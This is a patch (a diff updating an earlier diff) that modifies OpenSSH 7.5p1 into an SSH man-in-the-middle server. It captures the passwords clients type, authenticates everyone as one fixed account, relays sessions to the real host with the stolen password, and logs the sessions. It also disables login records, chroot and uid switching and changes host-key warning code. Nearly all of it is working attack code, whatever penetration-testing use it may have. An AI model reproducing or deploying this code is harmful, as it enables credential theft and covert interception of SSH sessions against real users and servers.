@@ -1,6 +1,6 @@
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth2.c openssh-7.5p1-mitm/auth2.c
 --- openssh-7.5p1/auth2.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth2.c	2017-05-16 12:54:06.002460345 -0400
++++ openssh-7.5p1-mitm/auth2.c	2017-06-27 18:08:39.748682710 -0400
 @@ -222,6 +222,10 @@
  		fatal("input_userauth_request: no authctxt");
  
@@ -31,7 +31,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  #ifdef _UNICOS
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth2-passwd.c openssh-7.5p1-mitm/auth2-passwd.c
 --- openssh-7.5p1/auth2-passwd.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth2-passwd.c	2017-05-16 14:53:10.293184705 -0400
++++ openssh-7.5p1-mitm/auth2-passwd.c	2017-06-27 18:08:39.748682710 -0400
 @@ -43,9 +43,11 @@
  #include "monitor_wrap.h"
  #include "misc.h"
@@ -60,7 +60,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	else if (PRIVSEP(auth_password(authctxt, password)) == 1)
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth.c openssh-7.5p1-mitm/auth.c
 --- openssh-7.5p1/auth.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth.c	2017-05-16 12:54:06.002460345 -0400
++++ openssh-7.5p1-mitm/auth.c	2017-06-27 18:08:39.748682710 -0400
 @@ -152,6 +152,8 @@
  #ifdef USE_LIBIAF
  		free((void *) passwd);
@@ -72,7 +72,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  			    pw->pw_name);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth.h openssh-7.5p1-mitm/auth.h
 --- openssh-7.5p1/auth.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth.h	2017-05-16 12:54:06.002460345 -0400
++++ openssh-7.5p1-mitm/auth.h	2017-06-27 18:08:39.748682710 -0400
 @@ -59,6 +59,7 @@
  	int		 server_caused_failure;
  	int		 force_pwchange;
@@ -83,7 +83,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	char		*style;
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth-passwd.c openssh-7.5p1-mitm/auth-passwd.c
 --- openssh-7.5p1/auth-passwd.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth-passwd.c	2017-05-16 12:54:06.006462344 -0400
++++ openssh-7.5p1-mitm/auth-passwd.c	2017-06-27 18:08:39.748682710 -0400
 @@ -121,6 +121,8 @@
  	if (options.use_pam)
  		return (sshpam_auth_passwd(authctxt, password) && ok);
@@ -95,7 +95,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  		expire_checked = 1;
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/channels.c openssh-7.5p1-mitm/channels.c
 --- openssh-7.5p1/channels.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/channels.c	2017-05-16 12:54:06.006462344 -0400
++++ openssh-7.5p1-mitm/channels.c	2017-06-27 18:08:39.752682773 -0400
 @@ -191,6 +191,40 @@
  static int connect_next(struct channel_connect *);
  static void channel_connect_ctx_free(struct channel_connect *);
@@ -170,7 +170,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  		    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/channels.h openssh-7.5p1-mitm/channels.h
 --- openssh-7.5p1/channels.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/channels.h	2017-05-16 12:54:06.006462344 -0400
++++ openssh-7.5p1-mitm/channels.h	2017-06-27 18:08:39.752682773 -0400
 @@ -100,6 +100,7 @@
  	u_int   istate;		/* input from channel (state of receive half) */
  	u_int   ostate;		/* output to channel  (state of transmit half) */
@@ -190,7 +190,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  void	 channel_stop_listening(void);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/clientloop.c openssh-7.5p1-mitm/clientloop.c
 --- openssh-7.5p1/clientloop.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/clientloop.c	2017-05-16 12:54:06.006462344 -0400
++++ openssh-7.5p1-mitm/clientloop.c	2017-06-27 18:08:39.752682773 -0400
 @@ -1752,7 +1752,10 @@
  	if (have_pty && options.log_level != SYSLOG_LEVEL_QUIET) {
  		snprintf(buf, sizeof buf,
@@ -203,9 +203,21 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	}
  
  	/* Output any buffered data for stdout. */
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/loginrec.c openssh-7.5p1-mitm/loginrec.c
+--- openssh-7.5p1/loginrec.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/loginrec.c	2017-06-27 18:08:39.752682773 -0400
+@@ -435,6 +435,8 @@
+ int
+ login_write(struct logininfo *li)
+ {
++        /* Since we never run as root, never attempt to record the log-in. */
++        return (0);
+ #ifndef HAVE_CYGWIN
+ 	if (geteuid() != 0) {
+ 		logit("Attempt to write login records by non-root user (aborting)");
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/lol.h openssh-7.5p1-mitm/lol.h
 --- openssh-7.5p1/lol.h	1969-12-31 19:00:00.000000000 -0500
-+++ openssh-7.5p1-mitm/lol.h	2017-05-16 15:40:33.349184705 -0400
++++ openssh-7.5p1-mitm/lol.h	2017-06-27 18:08:39.752682773 -0400
 @@ -0,0 +1,25 @@
 +#ifndef LOL_H
 +#define LOL_H
@@ -221,7 +233,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
 +/* This is the user account that all incoming connections will authenticate
 + * as (the provided user name is ignored).  This is also the account home
 + * directory where logged sessions are stored. */
-+#define BOGUS_USER "bogus"
++#define BOGUS_USER "ssh-mitm"
 +
 +struct _Lol {
 +  char *original_host;
@@ -234,7 +246,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
 +#endif /* LOL_H */
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor.c openssh-7.5p1-mitm/monitor.c
 --- openssh-7.5p1/monitor.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor.c	2017-05-16 12:54:06.006462344 -0400
++++ openssh-7.5p1-mitm/monitor.c	2017-06-27 18:08:39.756682837 -0400
 @@ -119,6 +119,7 @@
  
  /* State exported from the child */
@@ -312,7 +324,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor.h openssh-7.5p1-mitm/monitor.h
 --- openssh-7.5p1/monitor.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor.h	2017-05-16 12:54:06.006462344 -0400
++++ openssh-7.5p1-mitm/monitor.h	2017-06-27 18:08:39.756682837 -0400
 @@ -56,6 +56,7 @@
  	MONITOR_REQ_GSSUSEROK = 46, MONITOR_ANS_GSSUSEROK = 47,
  	MONITOR_REQ_GSSCHECKMIC = 48, MONITOR_ANS_GSSCHECKMIC = 49,
@@ -323,7 +335,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	MONITOR_REQ_PAM_ACCOUNT = 102, MONITOR_ANS_PAM_ACCOUNT = 103,
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor_wrap.c openssh-7.5p1-mitm/monitor_wrap.c
 --- openssh-7.5p1/monitor_wrap.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor_wrap.c	2017-05-16 12:54:06.006462344 -0400
++++ openssh-7.5p1-mitm/monitor_wrap.c	2017-06-27 18:08:39.760682900 -0400
 @@ -482,6 +482,31 @@
  	sshbuf_free(m);
  }
@@ -358,7 +370,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  {
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor_wrap.h openssh-7.5p1-mitm/monitor_wrap.h
 --- openssh-7.5p1/monitor_wrap.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor_wrap.h	2017-05-16 12:54:06.006462344 -0400
++++ openssh-7.5p1-mitm/monitor_wrap.h	2017-06-27 18:08:39.760682900 -0400
 @@ -28,6 +28,8 @@
  #ifndef _MM_WRAP_H_
  #define _MM_WRAP_H_
@@ -382,7 +394,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  int mm_bsdauth_query(void *, char **, char **, u_int *, char ***, u_int **);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c
 --- openssh-7.5p1/session.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/session.c	2017-05-16 12:54:06.010464344 -0400
++++ openssh-7.5p1-mitm/session.c	2017-06-27 18:08:39.760682900 -0400
 @@ -112,7 +112,7 @@
  /* func */
  
@@ -529,7 +541,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
 +
 +		debug3("MITMing connection to %s:%s", connect_string, port);
 +
-+		argv[0] = "/home/bogus/ssh";
++		argv[0] = "/home/" BOGUS_USER "/ssh";
 +		argv[1] = "-Z";
 +		argv[2] = lol->password;
 +		argv[3] = "-p";
@@ -612,7 +624,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  /*
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/ssh.c openssh-7.5p1-mitm/ssh.c
 --- openssh-7.5p1/ssh.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/ssh.c	2017-05-16 12:54:06.010464344 -0400
++++ openssh-7.5p1-mitm/ssh.c	2017-06-27 18:08:39.760682900 -0400
 @@ -524,6 +524,7 @@
  	struct addrinfo *addrs = NULL;
  	struct ssh_digest_ctx *md;
@@ -652,7 +664,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  		sensitive_data.nkeys = 9;
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshconnect2.c openssh-7.5p1-mitm/sshconnect2.c
 --- openssh-7.5p1/sshconnect2.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshconnect2.c	2017-05-16 12:54:06.010464344 -0400
++++ openssh-7.5p1-mitm/sshconnect2.c	2017-06-27 18:08:39.764682963 -0400
 @@ -906,7 +906,8 @@
  
  	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
@@ -665,7 +677,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	packet_put_cstring(authctxt->service);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshconnect.c openssh-7.5p1-mitm/sshconnect.c
 --- openssh-7.5p1/sshconnect.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshconnect.c	2017-05-16 12:54:06.010464344 -0400
++++ openssh-7.5p1-mitm/sshconnect.c	2017-06-27 18:08:39.764682963 -0400
 @@ -916,10 +916,12 @@
  				    "address '%.128s' to the list of known "
  				    "hosts (%.500s).", type, ip,
@@ -715,7 +727,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  		error("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshconnect.h openssh-7.5p1-mitm/sshconnect.h
 --- openssh-7.5p1/sshconnect.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshconnect.h	2017-05-16 12:54:06.010464344 -0400
++++ openssh-7.5p1-mitm/sshconnect.h	2017-06-27 18:08:39.764682963 -0400
 @@ -29,6 +29,7 @@
  	Key	**keys;
  	int	nkeys;
@@ -726,7 +738,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  struct addrinfo;
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshd.c openssh-7.5p1-mitm/sshd.c
 --- openssh-7.5p1/sshd.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshd.c	2017-05-16 15:32:38.189184705 -0400
++++ openssh-7.5p1-mitm/sshd.c	2017-06-27 18:08:39.764682963 -0400
 @@ -72,6 +72,8 @@
  #include <string.h>
  #include <unistd.h>
@@ -754,7 +766,22 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  /* This is set to true when a signal is received. */
  static volatile sig_atomic_t received_sighup = 0;
  static volatile sig_atomic_t received_sigterm = 0;
-@@ -672,6 +678,7 @@
+@@ -543,10 +549,13 @@
+ 	/* Demote the child */
+ 	if (getuid() == 0 || geteuid() == 0) {
+ 		/* Change our root directory */
++/* chroot() won't work since we are not running as root. */
++/*
+ 		if (chroot(_PATH_PRIVSEP_CHROOT_DIR) == -1)
+ 			fatal("chroot(\"%s\"): %s", _PATH_PRIVSEP_CHROOT_DIR,
+ 			    strerror(errno));
+-		if (chdir("/") == -1)
++*/
++		if (chdir("/home/ssh-mitm/") == -1)
+ 			fatal("chdir(\"/\"): %s", strerror(errno));
+ 
+ 		/* Drop our privileges */
+@@ -672,6 +681,7 @@
   skip:
  	/* It is safe now to apply the key state */
  	monitor_apply_keystate(pmonitor);
@@ -762,7 +789,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
  	/*
  	 * Tell the packet layer that authentication was successful, since
-@@ -1372,6 +1379,12 @@
+@@ -1372,6 +1382,18 @@
  	int keytype;
  	Authctxt *authctxt;
  	struct connection_info *connection_info = get_connection_info(0, 0);
@@ -772,10 +799,26 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
 +#endif
 +
 +	lol = (Lol *)calloc(1, sizeof(Lol));
++
++        /* Terminate if sshd_mitm is running as root. */
++        if ((getuid() == 0) || (getgid() == 0)) {
++            fprintf(stderr, "Error: sshd_mitm must be run under a non-privileged account and not root!\n");
++            exit(-1);
++        }
  
  	ssh_malloc_init();	/* must be called before any mallocs */
  
-@@ -1956,6 +1969,17 @@
+@@ -1780,7 +1802,8 @@
+ 		    (st.st_uid != getuid () ||
+ 		    (st.st_mode & (S_IWGRP|S_IWOTH)) != 0))
+ #else
+-		if (st.st_uid != 0 || (st.st_mode & (S_IWGRP|S_IWOTH)) != 0)
++                /* Ownership of the chroot directory no longer relevant. */
++                if (0)
+ #endif
+ 			fatal("%s must be owned by root and not group or "
+ 			    "world-writable.", _PATH_PRIVSEP_CHROOT_DIR);
+@@ -1956,6 +1979,17 @@
  	signal(SIGCHLD, SIG_DFL);
  	signal(SIGINT, SIG_DFL);
  
@@ -793,7 +836,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	/*
  	 * Register our connection.  This turns encryption off because we do
  	 * not have a key.
-@@ -2040,6 +2064,7 @@
+@@ -2040,6 +2074,7 @@
  	 */
  	if (use_privsep) {
  		mm_send_keystate(pmonitor);
@@ -803,17 +846,23 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshd_config openssh-7.5p1-mitm/sshd_config
 --- openssh-7.5p1/sshd_config	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshd_config	2017-05-16 14:30:10.573184705 -0400
-@@ -15,17 +15,17 @@
++++ openssh-7.5p1-mitm/sshd_config	2017-06-27 18:08:39.764682963 -0400
+@@ -10,22 +10,22 @@
+ # possible, but leave them commented.  Uncommented options override the
+ # default value.
+ 
+-#Port 22
++Port 2222
+ #AddressFamily any
  #ListenAddress 0.0.0.0
  #ListenAddress ::
  
 -#HostKey /etc/ssh/ssh_host_rsa_key
-+HostKey /usr/local/etc/ssh_host_rsa_key
++HostKey /home/ssh-mitm/ssh_host_rsa_key
  #HostKey /etc/ssh/ssh_host_dsa_key
  #HostKey /etc/ssh/ssh_host_ecdsa_key
 -#HostKey /etc/ssh/ssh_host_ed25519_key
-+HostKey /usr/local/etc/ssh_host_ed25519_key
++HostKey /home/ssh-mitm/ssh_host_ed25519_key
  
  # Ciphers and keying
  #RekeyLimit default none
@@ -828,7 +877,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshlogin.c openssh-7.5p1-mitm/sshlogin.c
 --- openssh-7.5p1/sshlogin.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshlogin.c	2017-05-16 12:54:06.010464344 -0400
++++ openssh-7.5p1-mitm/sshlogin.c	2017-06-27 18:08:39.768683027 -0400
 @@ -113,7 +113,8 @@
  		else
  			snprintf(buf, sizeof(buf), "Last login: %s from %s\r\n",
@@ -839,4 +888,42 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	}
  # endif /* CUSTOM_SYS_AUTH_GET_LASTLOGIN_MSG */
  #endif /* NO_SSH_LASTLOG */
-
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/uidswap.c openssh-7.5p1-mitm/uidswap.c
+--- openssh-7.5p1/uidswap.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/uidswap.c	2017-06-27 18:08:39.768683027 -0400
+@@ -59,6 +59,8 @@
+ void
+ temporarily_use_uid(struct passwd *pw)
+ {
++        /* Since we are never running as root, don't ever try to change uid/gid. */
++	return;
+ 	/* Save the current euid, and egroups. */
+ #ifdef SAVED_IDS_WORK_WITH_SETEUID
+ 	saved_euid = geteuid();
+@@ -134,6 +136,8 @@
+ void
+ permanently_drop_suid(uid_t uid)
+ {
++        /* Since we are never running as root, don't ever try to change uid/gid. */
++	return;
+ #ifndef NO_UID_RESTORATION_TEST
+ 	uid_t old_uid = getuid();
+ #endif
+@@ -168,6 +172,8 @@
+ void
+ restore_uid(void)
+ {
++        /* Since we are never running as root, don't ever try to change uid/gid. */
++	return;
+ 	/* it's a no-op unless privileged */
+ 	if (!privileged) {
+ 		debug("restore_uid: (unprivileged)");
+@@ -205,6 +211,8 @@
+ void
+ permanently_set_uid(struct passwd *pw)
+ {
++        /* Since we are never running as root, don't ever try to change uid/gid. */
++	return;
+ #ifndef NO_UID_RESTORATION_TEST
+ 	uid_t old_uid = getuid();
+ 	gid_t old_gid = getgid();
